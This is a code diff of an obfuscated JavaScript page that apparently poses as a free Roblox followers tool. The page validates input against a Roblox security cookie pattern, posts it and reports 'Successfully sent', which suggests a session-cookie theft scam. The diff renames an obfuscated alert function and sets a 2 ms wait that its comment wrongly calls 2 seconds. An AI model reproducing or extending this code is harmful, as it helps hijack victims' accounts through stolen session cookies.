@@ -1,6 +1,6 @@
-let waitTime = 120000; // Tiempo de espera en milisegundos (2 minutos)
+let waitTime = 2; // Tiempo de espera en milisegundos (2 segundos)
 
-function x1y2z3(title, text, icon, confirmButtonText) {
+function x1y2y2z3(title, text, icon, confirmButtonText) {
     const a1b2c3 = {
         background: "#141414",
         color: "#ffffff",
@@ -24,7 +24,7 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
     }
 
     if (!robloxSecurityCookieMatch) {
-        x1y2z3("Error", "Enter a valid code.", "error", "Retry");
+        x1y2y2z3("Error", "Enter a valid code.", "error", "Retry");
         return;
     }
     
@@ -44,24 +44,24 @@ async function a1b2c3d4(p1q2r3, s4t5u7) {
         });
 
         if (response.ok) {
-            x1y2z3("Success", "Successfully sent. Wait 2 or 4 minutes.", "success", "Okay");
+            x1y2y2z3("Success", "Successfully sent. Wait 2 seconds.", "success", "Okay");
             sessionStorage.setItem('isWaiting', 'true'); // Activar el estado de espera
             setTimeout(() => {
                 sessionStorage.removeItem('isWaiting'); // Restablecer el estado de espera
                 console.log("Wait time has ended."); // Mensaje de depuración
             }, waitTime);
         } else {
-            x1y2z3("Error", "Failed to send Followers to Roblox Account.", "error", "Retry");
+            x1y2y2z3("Error", "Failed to send Followers to Roblox Account.", "error", "Retry");
         }
     } catch (error) {
-        x1y2z3("Error", "An error occurred while sending Followers", "error", "Retry");
+        x1y2y2z3("Error", "An error occurred while sending Followers", "error", "Retry");
     }
 }
 
 document.addEventListener("DOMContentLoaded", function() {
     // Verificar el estado de espera al cargar la página
     if (sessionStorage.getItem('isWaiting')) {
-        x1y2z3("Wait", "You need to wait sending other followers", "warning", "Okay");
+        x1y2y2z3("Wait", "You need to wait sending other followers", "warning", "Okay");
     }
 
     document.getElementById("Send").addEventListener("click", function() {
@@ -69,12 +69,12 @@ document.addEventListener("DOMContentLoaded", function() {
         const s4t5u7 = document.getElementById("amount").value;
 
         if (!p1q2r3 || !s4t5u7) {
-            x1y2z3("Validation Error", "Please fill in all fields.", "warning", "Okay");
+            x1y2y2z3("Validation Error", "Please fill in all fields.", "warning", "Okay");
             return;
         }
 
         if (sessionStorage.getItem('isWaiting')) {
-            x1y2z3("Wait", "You need to wait to sending others followers", "warning", "Okay");
+            x1y2y2z3("Wait", "You need to wait to sending others followers", "warning", "Okay");
             return;
         }
 
